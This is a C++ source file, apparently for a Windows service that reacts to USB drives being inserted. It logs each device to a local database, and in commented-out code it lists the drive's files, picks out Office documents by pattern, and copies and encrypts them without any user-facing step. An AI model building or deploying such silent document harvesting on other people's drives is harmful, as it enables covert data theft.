#include "stdafx.h"
#include "Device.h"
#include <memory>
#include <list>
#include <fstream>
#include <sstream>
#include <string>
#include "FileLister.h"
#include "AESKey.h"
#include "AESEncrypt.h"
#include <filesystem>
#include "Convert.h"
#include "FileSearcher.h"
#include "FileCopyer.h"
#include "SystemConfig.h"
#include "sql_connection_error.h"
#include "SQLConnection.h"
using namespace std;
using namespace filesystem;

bool IsServiceOn = true;

void DeviceArrivalMain(TCHAR DriveLetter) {
	Device dv(DriveLetter);

	try {
		SQLConnection conn(L"test.idb");
		conn.open();
		conn.insertRecord(dv);
		conn.close();
	}
	catch (sql_connection_error & sqle) {
		MessageBoxA(NULL, sqle.what(), "", MB_ICONERROR);
	}

	/*
	Device::DiskInformation info = dv.GetDiskInformation();
	FileLister lister(dv);
	shared_ptr<list<FileData>> pls = lister.ListFile();
	FileSearcher fs;
	shared_ptr<list<FileData>> psls = fs.FindFileRegex(pls, { L".*.ppt",L".*.pptx",L".*.xls",L".*.xlsx" ,L".*.doc" ,L".*.docx" });
	FileCopyer cp(dv, psls);
	cp.ListFile(pls);
	cp.Copy();
	cp.Encrypt();
	*/
	/*
	if (SystemConfig::getInstance()->FileCopyer) {
		if (SystemConfig::getInstance()->NormalCopy) {
			FileSearcher fsr;
			shared_ptr<list<FileData>> psls = fsr.FindFile(pls, SystemConfig::getInstance()->NormalCopyFilters);
			cp.setPaths(psls);
			cp.Copy();
			cp.Encrypt();
		}
		if (SystemConfig::getInstance()->RegexCopy) {
			FileSearcher fsr;
			shared_ptr<list<FileData>> psls = fsr.FindFileRegex(pls, SystemConfig::getInstance()->RegexCopyFilters);
			cp.setPaths(psls);
			cp.Copy();
			cp.Encrypt();
		}
	}
	*/
}

void DeviceRemovalMain(TCHAR DriveLetter) {

}

// Usually this function should be empty.
void InitProgram() {
	
}